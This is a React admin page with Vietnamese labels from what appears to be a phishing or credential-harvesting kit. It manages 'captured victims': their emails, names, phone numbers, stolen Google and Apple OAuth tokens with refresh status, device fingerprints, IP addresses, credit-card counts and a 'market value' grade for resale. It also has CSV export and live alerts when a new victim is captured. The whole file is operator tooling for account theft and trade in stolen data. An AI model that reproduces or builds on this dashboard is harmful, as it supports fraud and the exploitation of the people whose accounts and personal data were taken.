import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { AuthService } from "@/shared/lib/auth";
import { Card, CardContent, CardHeader, CardTitle } from "@/shared/components/ui/card";
import { Button } from "@/shared/components/ui/button";
import { Input } from "@/shared/components/ui/input";
import { Badge } from "@/shared/components/ui/badge";
import { Checkbox } from "@/shared/components/ui/checkbox";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/shared/components/ui/table";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/shared/components/ui/select";
import { useToast } from "@/shared/hooks/use-toast";
import {
  Users,
  Search,
  Filter,
  Download,
  Eye,
  Trash2,
  RefreshCw,
  Shield,
  Smartphone,
  Globe,
  CreditCard,
  Calendar,
  Mail,
  Phone,
  User,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Copy,
  ExternalLink,
  BarChart3,
} from "lucide-react";
import { Victim, OAuthToken, PaginatedResponse, FilterOptions } from "@/shared/types";
import {
  formatDate,
  formatRelativeTime,
  debounce,
  copyToClipboard,
} from "@/shared/lib/utils";
import { useWebSocket } from "@/shared/hooks/use-websocket";
import { DeviceFingerprintViewer } from "@/shared/components/victims/device-fingerprint-viewer";

export default function Victims() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [searchTerm, setSearchTerm] = useState("");
  const [filters, setFilters] = useState<FilterOptions & { 
    campaign_id?: string;
    market_value?: string;
    capture_method?: string;
  }>({
    page: 1,
    per_page: 20,
    status: "",
  });
  const [selectedVictim, setSelectedVictim] = useState<Victim | null>(null);
  const [selectedVictims, setSelectedVictims] = useState<Set<string>>(new Set());
  const [showBulkActions, setShowBulkActions] = useState(false);

  // Real-time updates via WebSocket
  useWebSocket({
    type: 'victims',
    enabled: true,
    onMessage: (message) => {
      if (message.type === 'victim:captured' || message.type === 'victim:registered') {
        queryClient.invalidateQueries({ queryKey: ['victims'] });
        queryClient.invalidateQueries({ queryKey: ['dashboard-stats'] });
        toast({
          title: "New Victim",
          description: message.data.email || "New victim captured",
        });
      }
    },
  });

  const { data, isLoading, refetch } = useQuery<PaginatedResponse<Victim>>({
    queryKey: ["victims", filters, searchTerm],
    queryFn: () => {
      const params = new URLSearchParams();
      Object.entries({ ...filters, search: searchTerm }).forEach(([key, value]) => {
        if (value) params.append(key, value.toString());
      });
      return AuthService.apiRequest(`/admin/victims?${params.toString()}`);
    },
  });

  const { data: oauthTokens } = useQuery<OAuthToken[]>({
    queryKey: ["oauth-tokens", selectedVictim?.id],
    queryFn: () => {
      if (!selectedVictim) return [];
      return AuthService.apiRequest(`/admin/victims/${selectedVictim.id}/oauth-tokens`);
    },
    enabled: !!selectedVictim,
  });

  const bulkDeleteMutation = useMutation({
    mutationFn: (victimIds: string[]) =>
      AuthService.apiRequest("/api/admin/victims/bulk-delete", {
        method: "POST",
        body: JSON.stringify({ victim_ids: victimIds }),
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["victims"] });
      queryClient.invalidateQueries({ queryKey: ["dashboard-stats"] });
      setSelectedVictims(new Set());
      setShowBulkActions(false);
      toast({
        title: "Thành công",
        description: "Đã xóa các victim đã chọn",
      });
    },
    onError: (error: Error) => {
      toast({
        title: "Lỗi",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const exportMutation = useMutation({
    mutationFn: (): Promise<string> => AuthService.apiRequest("/api/admin/victims/export"),
    onSuccess: (data: string) => {
      const blob = new Blob([data], { type: "text/csv" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `victims_${new Date().toISOString().split("T")[0]}.csv`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast({
        title: "Thành công",
        description: "Dữ liệu đã được xuất thành công",
      });
    },
    onError: (error: Error) => {
      toast({
        title: "Lỗi",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const debouncedSearch = debounce((value: string) => {
    setFilters({ ...filters, page: 1 });
  }, 500);

  const handleSearch = (value: string) => {
    setSearchTerm(value);
    debouncedSearch(value);
  };

  const handleSelectVictim = (victimId: string, checked: boolean) => {
    const newSelected = new Set(selectedVictims);
    if (checked) {
      newSelected.add(victimId);
    } else {
      newSelected.delete(victimId);
    }
    setSelectedVictims(newSelected);
    setShowBulkActions(newSelected.size > 0);
  };

  const handleSelectAll = (checked: boolean) => {
    if (checked) {
      const allIds = new Set(data?.items.map(v => v.id) || []);
      setSelectedVictims(allIds);
      setShowBulkActions(true);
    } else {
      setSelectedVictims(new Set());
      setShowBulkActions(false);
    }
  };

  const handleBulkDelete = () => {
    if (selectedVictims.size === 0) return;
    if (!confirm(`Bạn có chắc chắn muốn xóa ${selectedVictims.size} victim đã chọn?`)) {
      return;
    }
    bulkDeleteMutation.mutate(Array.from(selectedVictims));
  };

  // Calculate stats from current data
  const totalVictims = data?.total || 0;
  const highValueCount = data?.items.filter(v => v.validation?.market_value === 'high' || v.validation?.market_value === 'premium').length || 0;
  const oauthCount = data?.items.filter(v => v.capture_method.startsWith('oauth')).length || 0;
  const activeCount = data?.items.filter(v => v.is_active).length || 0;

  const getMarketValueColor = (value?: string) => {
    switch (value) {
      case 'premium': return 'bg-purple-100 text-purple-800';
      case 'high': return 'bg-red-100 text-red-800';
      case 'medium': return 'bg-yellow-100 text-yellow-800';
      case 'low': return 'bg-gray-100 text-gray-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  const getMarketValueLabel = (value?: string) => {
    switch (value) {
      case 'premium': return 'Premium';
      case 'high': return 'Cao';
      case 'medium': return 'Trung bình';
      case 'low': return 'Thấp';
      default: return 'Chưa xác định';
    }
  };

  const getRiskLevelColor = (level?: string) => {
    switch (level) {
      case 'high': return 'bg-red-100 text-red-800';
      case 'medium': return 'bg-yellow-100 text-yellow-800';
      case 'low': return 'bg-green-100 text-green-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  return (
    <div className="p-6 max-w-7xl mx-auto">
      {/* Header */}
      <div className="mb-8">
        <div className="flex justify-between items-start">
          <div>
            <h1 className="text-3xl font-bold text-gray-900">Quản lý Victims</h1>
            <p className="text-gray-600 mt-2">
              Quản lý và theo dõi các victim đã được capture
            </p>
          </div>
          <div className="flex gap-2">
            <Button
              onClick={() => refetch()}
              variant="outline"
              size="sm"
            >
              <RefreshCw className="h-4 w-4 mr-2" />
              Làm mới
            </Button>
            <Button
              onClick={() => exportMutation.mutate()}
              disabled={exportMutation.isPending}
              variant="outline"
            >
              <Download className="h-4 w-4 mr-2" />
              {exportMutation.isPending ? "Đang xuất..." : "Xuất CSV"}
            </Button>
          </div>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
        <Card className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Tổng Victims</p>
                <p className="text-2xl font-bold text-gray-900">
                  {totalVictims}
                </p>
              </div>
              <div className="p-3 bg-blue-50 rounded-lg">
                <Users className="h-6 w-6 text-blue-600" />
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">High Value</p>
                <p className="text-2xl font-bold text-purple-600">
                  {highValueCount}
                </p>
              </div>
              <div className="p-3 bg-purple-50 rounded-lg">
                <AlertTriangle className="h-6 w-6 text-purple-600" />
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">OAuth Captures</p>
                <p className="text-2xl font-bold text-green-600">
                  {oauthCount}
                </p>
              </div>
              <div className="p-3 bg-green-50 rounded-lg">
                <Shield className="h-6 w-6 text-green-600" />
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Active</p>
                <p className="text-2xl font-bold text-blue-600">
                  {activeCount}
                </p>
              </div>
              <div className="p-3 bg-blue-50 rounded-lg">
                <CheckCircle2 className="h-6 w-6 text-blue-600" />
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Bulk Actions Bar */}
      {showBulkActions && (
        <Card className="mb-6 bg-blue-50 border-blue-200">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-4">
                <span className="text-sm font-medium text-gray-700">
                  Đã chọn {selectedVictims.size} victim
                </span>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => {
                    setSelectedVictims(new Set());
                    setShowBulkActions(false);
                  }}
                >
                  Bỏ chọn tất cả
                </Button>
              </div>
              <div className="flex gap-2">
                <Button
                  variant="destructive"
                  size="sm"
                  onClick={handleBulkDelete}
                  disabled={bulkDeleteMutation.isPending}
                >
                  <Trash2 className="h-4 w-4 mr-2" />
                  Xóa đã chọn ({selectedVictims.size})
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Filters */}
      <Card className="mb-6">
        <CardContent className="p-6">
          <div className="flex flex-col lg:flex-row gap-4 items-center justify-between">
            <div className="flex flex-1 gap-4 w-full lg:w-auto">
              <div className="relative flex-1 lg:w-80">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                <Input
                  placeholder="Tìm kiếm email, tên, số điện thoại..."
                  value={searchTerm}
                  onChange={(e) => handleSearch(e.target.value)}
                  className="pl-10"
                />
              </div>
              <Select
                value={filters.capture_method || ""}
                onValueChange={(value) =>
                  setFilters({ ...filters, capture_method: value || undefined, page: 1 })
                }
              >
                <SelectTrigger className="w-40">
                  <SelectValue placeholder="Phương thức" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="">Tất cả</SelectItem>
                  <SelectItem value="oauth_google">OAuth Google</SelectItem>
                  <SelectItem value="oauth_apple">OAuth Apple</SelectItem>
                  <SelectItem value="form_direct">Form Direct</SelectItem>
                </SelectContent>
              </Select>
              <Select
                value={filters.market_value || ""}
                onValueChange={(value) =>
                  setFilters({ ...filters, market_value: value || undefined, page: 1 })
                }
              >
                <SelectTrigger className="w-40">
                  <SelectValue placeholder="Giá trị" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="">Tất cả</SelectItem>
                  <SelectItem value="premium">Premium</SelectItem>
                  <SelectItem value="high">Cao</SelectItem>
                  <SelectItem value="medium">Trung bình</SelectItem>
                  <SelectItem value="low">Thấp</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Table */}
      <Card>
        <CardContent className="p-0">
          {isLoading ? (
            <div className="p-12 text-center">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
              <p className="text-lg font-medium text-gray-700">Đang tải dữ liệu...</p>
            </div>
          ) : data?.items.length === 0 ? (
            <div className="p-12 text-center">
              <Users className="h-12 w-12 mx-auto mb-4 text-gray-300" />
              <p className="text-lg font-medium text-gray-700">Không có dữ liệu</p>
            </div>
          ) : (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead className="w-12">
                    <Checkbox
                      checked={selectedVictims.size === data?.items.length && data.items.length > 0}
                      onCheckedChange={handleSelectAll}
                    />
                  </TableHead>
                  <TableHead>Email</TableHead>
                  <TableHead>Thông tin</TableHead>
                  <TableHead>Phương thức</TableHead>
                  <TableHead>Campaign</TableHead>
                  <TableHead>Giá trị</TableHead>
                  <TableHead>Device Fingerprint</TableHead>
                  <TableHead>Ngày capture</TableHead>
                  <TableHead className="text-right">Thao tác</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {data?.items.map((victim) => (
                  <TableRow key={victim.id} className="hover:bg-gray-50">
                    <TableCell>
                      <Checkbox
                        checked={selectedVictims.has(victim.id)}
                        onCheckedChange={(checked) => handleSelectVictim(victim.id, checked as boolean)}
                      />
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-2">
                        <Mail className="h-4 w-4 text-gray-400" />
                        <span className="font-medium text-gray-900">{victim.email}</span>
                      </div>
                    </TableCell>
                    <TableCell>
                      <div className="space-y-1">
                        {victim.name && (
                          <div className="flex items-center gap-2 text-sm">
                            <User className="h-3 w-3 text-gray-400" />
                            <span>{victim.name}</span>
                          </div>
                        )}
                        {victim.phone && (
                          <div className="flex items-center gap-2 text-sm">
                            <Phone className="h-3 w-3 text-gray-400" />
                            <span>{victim.phone}</span>
                          </div>
                        )}
                      </div>
                    </TableCell>
                    <TableCell>
                      <Badge variant="outline">
                        {victim.capture_method === 'oauth_google' ? 'OAuth Google' :
                         victim.capture_method === 'oauth_apple' ? 'OAuth Apple' :
                         'Form Direct'}
                      </Badge>
                    </TableCell>
                    <TableCell>
                      {victim.campaign ? (
                        <Badge variant="outline">{victim.campaign.name}</Badge>
                      ) : (
                        <span className="text-sm text-gray-400">-</span>
                      )}
                    </TableCell>
                    <TableCell>
                      <Badge className={getMarketValueColor(victim.validation?.market_value)}>
                        {getMarketValueLabel(victim.validation?.market_value)}
                      </Badge>
                    </TableCell>
                    <TableCell>
                      {victim.device_fingerprint?.fingerprint_id ? (
                        <div className="flex items-center gap-2">
                          <Smartphone className="h-4 w-4 text-gray-400" />
                          <span className="text-xs font-mono text-gray-600">
                            {victim.device_fingerprint.fingerprint_id.substring(0, 12)}...
                          </span>
                        </div>
                      ) : (
                        <span className="text-sm text-gray-400">-</span>
                      )}
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-2 text-sm">
                        <Calendar className="h-3 w-3 text-gray-400" />
                        <span>{formatRelativeTime(victim.capture_timestamp)}</span>
                      </div>
                    </TableCell>
                    <TableCell className="text-right">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => setSelectedVictim(victim)}
                      >
                        <Eye className="h-4 w-4 mr-1" />
                        Xem
                      </Button>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>

      {/* Pagination */}
      {data && data.pages > 1 && (
        <div className="mt-6 flex justify-center">
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              onClick={() => setFilters({ ...filters, page: filters.page! - 1 })}
              disabled={filters.page === 1}
            >
              Trước
            </Button>
            <span className="text-sm text-gray-600 px-4">
              Trang {filters.page} / {data.pages} (Tổng: {data.total} bản ghi)
            </span>
            <Button
              variant="outline"
              onClick={() => setFilters({ ...filters, page: filters.page! + 1 })}
              disabled={filters.page === data.pages}
            >
              Sau
            </Button>
          </div>
        </div>
      )}

      {/* Victim Detail Modal */}
      {selectedVictim && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg max-w-6xl w-full max-h-screen overflow-y-auto">
            <div className="p-6">
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-2xl font-bold text-gray-900">
                  Chi tiết Victim
                </h2>
                <Button
                  variant="outline"
                  onClick={() => setSelectedVictim(null)}
                >
                  Đóng
                </Button>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                {/* Basic Info */}
                <Card>
                  <CardHeader>
                    <CardTitle className="text-lg flex items-center gap-2">
                      <User className="h-5 w-5" />
                      Thông tin cơ bản
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <label className="text-sm font-medium text-gray-500">Email</label>
                      <div className="flex items-center gap-2 mt-1">
                        <p className="text-sm font-semibold text-gray-900">{selectedVictim.email}</p>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-6 w-6"
                          onClick={() => {
                            copyToClipboard(selectedVictim.email);
                            toast({ title: "Đã sao chép", description: "Email đã được sao chép" });
                          }}
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                    {selectedVictim.name && (
                      <div>
                        <label className="text-sm font-medium text-gray-500">Tên</label>
                        <p className="text-sm text-gray-900 mt-1">{selectedVictim.name}</p>
                      </div>
                    )}
                    {selectedVictim.phone && (
                      <div>
                        <label className="text-sm font-medium text-gray-500">Số điện thoại</label>
                        <p className="text-sm text-gray-900 mt-1">{selectedVictim.phone}</p>
                      </div>
                    )}
                    <div>
                      <label className="text-sm font-medium text-gray-500">Phương thức capture</label>
                      <Badge className="mt-1">
                        {selectedVictim.capture_method === 'oauth_google' ? 'OAuth Google' :
                         selectedVictim.capture_method === 'oauth_apple' ? 'OAuth Apple' :
                         'Form Direct'}
                      </Badge>
                    </div>
                    <div>
                      <label className="text-sm font-medium text-gray-500">Ngày capture</label>
                      <p className="text-sm text-gray-900 mt-1">{formatDate(selectedVictim.capture_timestamp)}</p>
                    </div>
                  </CardContent>
                </Card>

                {/* Campaign & Validation */}
                <Card>
                  <CardHeader>
                    <CardTitle className="text-lg flex items-center gap-2">
                      <BarChart3 className="h-5 w-5" />
                      Campaign & Validation
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {selectedVictim.campaign ? (
                      <div>
                        <label className="text-sm font-medium text-gray-500">Campaign</label>
                        <p className="text-sm font-semibold text-gray-900 mt-1">{selectedVictim.campaign.name}</p>
                      </div>
                    ) : (
                      <div>
                        <label className="text-sm font-medium text-gray-500">Campaign</label>
                        <p className="text-sm text-gray-400 mt-1">Không có</p>
                      </div>
                    )}
                    <div>
                      <label className="text-sm font-medium text-gray-500">Giá trị thị trường</label>
                      <Badge className={getMarketValueColor(selectedVictim.validation?.market_value)}>
                        {getMarketValueLabel(selectedVictim.validation?.market_value)}
                      </Badge>
                    </div>
                    {selectedVictim.risk_assessment && (
                      <div>
                        <label className="text-sm font-medium text-gray-500">Mức độ rủi ro</label>
                        <Badge className={getRiskLevelColor(selectedVictim.risk_assessment.risk_level)}>
                          {selectedVictim.risk_assessment.risk_level || 'Chưa đánh giá'}
                        </Badge>
                      </div>
                    )}
                    {selectedVictim.card_information?.has_cards && (
                      <div>
                        <label className="text-sm font-medium text-gray-500">Thẻ tín dụng</label>
                        <div className="flex items-center gap-2 mt-1">
                          <CreditCard className="h-4 w-4 text-green-500" />
                          <span className="text-sm text-gray-900">
                            {selectedVictim.card_information.cards_count || 0} thẻ
                          </span>
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* OAuth Tokens */}
                <Card>
                  <CardHeader>
                    <CardTitle className="text-lg flex items-center gap-2">
                      <Shield className="h-5 w-5" />
                      OAuth Tokens
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {oauthTokens && oauthTokens.length > 0 ? (
                      oauthTokens.map((token) => (
                        <div key={token.id} className="p-3 bg-gray-50 rounded-lg">
                          <div className="flex items-center justify-between mb-2">
                            <Badge variant="outline">{token.provider}</Badge>
                            <Badge className={
                              token.token_status === 'active' ? 'bg-green-100 text-green-800' :
                              token.token_status === 'expired' ? 'bg-red-100 text-red-800' :
                              'bg-gray-100 text-gray-800'
                            }>
                              {token.token_status}
                            </Badge>
                          </div>
                          <div className="text-xs text-gray-600 space-y-1">
                            <p>Issued: {formatDate(token.issued_at)}</p>
                            <p>Expires: {formatDate(token.expires_at)}</p>
                            {token.refresh_count > 0 && (
                              <p>Refreshed: {token.refresh_count} times</p>
                            )}
                          </div>
                        </div>
                      ))
                    ) : (
                      <p className="text-sm text-gray-400">Không có OAuth tokens</p>
                    )}
                  </CardContent>
                </Card>

                {/* Device Fingerprint */}
                <div className="lg:col-span-3">
                  <DeviceFingerprintViewer fingerprint={selectedVictim.device_fingerprint} />
                </div>

                {/* Session Data */}
                <Card className="lg:col-span-3">
                  <CardHeader>
                    <CardTitle className="text-lg flex items-center gap-2">
                      <Globe className="h-5 w-5" />
                      Session Data
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                      {selectedVictim.session_data.ip_address && (
                        <div>
                          <label className="text-sm font-medium text-gray-500">IP Address</label>
                          <p className="text-sm text-gray-900 mt-1">{selectedVictim.session_data.ip_address}</p>
                        </div>
                      )}
                      {selectedVictim.session_data.user_agent && (
                        <div className="md:col-span-2">
                          <label className="text-sm font-medium text-gray-500">User Agent</label>
                          <p className="text-sm text-gray-900 mt-1 break-all">{selectedVictim.session_data.user_agent}</p>
                        </div>
                      )}
                      {selectedVictim.session_data.utm_parameters && (
                        <div className="md:col-span-4">
                          <label className="text-sm font-medium text-gray-500">UTM Parameters</label>
                          <div className="mt-2 flex flex-wrap gap-2">
                            {selectedVictim.session_data.utm_parameters.utm_source && (
                              <Badge variant="outline">Source: {selectedVictim.session_data.utm_parameters.utm_source}</Badge>
                            )}
                            {selectedVictim.session_data.utm_parameters.utm_medium && (
                              <Badge variant="outline">Medium: {selectedVictim.session_data.utm_parameters.utm_medium}</Badge>
                            )}
                            {selectedVictim.session_data.utm_parameters.utm_campaign && (
                              <Badge variant="outline">Campaign: {selectedVictim.session_data.utm_parameters.utm_campaign}</Badge>
                            )}
                          </div>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

